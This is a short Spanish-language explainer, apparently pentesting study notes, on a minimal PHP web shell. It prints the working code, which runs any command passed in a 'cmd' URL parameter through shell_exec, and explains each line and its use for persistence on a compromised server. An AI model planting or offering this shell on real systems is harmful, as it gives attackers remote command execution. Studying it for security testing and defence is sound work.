
## Script de Web Shell en PHP

PHP

```
<?php
if(isset($_GET['cmd'])) {
    echo "<pre>" . shell_exec($_GET['cmd']) . "</pre>";
}
?>
```

### ¿Qué es?

Es una **web shell minimalista**. Es un script en PHP que, una vez subido a un servidor web vulnerable, permite ejecutar comandos del sistema operativo de forma remota a través del navegador.

### ¿Para qué se usa?

Se utiliza en auditorías de seguridad y pruebas de penetración (pentesting) para mantener **persistencia** en un servidor comprometido y ejecutar comandos en la máquina víctima sin necesidad de una conexión SSH o reverse shell interactiva inmediata.

### Componentes del código:

- **`<?php ... ?>`**: Delimitadores que indican al servidor web que el código de su interior debe ser interpretado como PHP.
    
- **`if(isset($_GET['cmd']))`**: Una condición que verifica si se ha enviado un parámetro llamado `cmd` a través de la URL (por ejemplo: `http://victima.com/shell.php?cmd=whoami`).
    
- **`shell_exec($_GET['cmd'])`**: La función interna de PHP que toma el valor recibido en `cmd` y lo ejecuta directamente en la terminal (shell) del servidor subyacente.
    
- **`echo "<pre>" . ... . "</pre>"`**: Muestra el resultado del comando en la pantalla del navegador. Las etiquetas HTML `<pre>` (texto preformateado) sirven para que las líneas y espacios se vean ordenados, tal como aparecerían en una terminal real.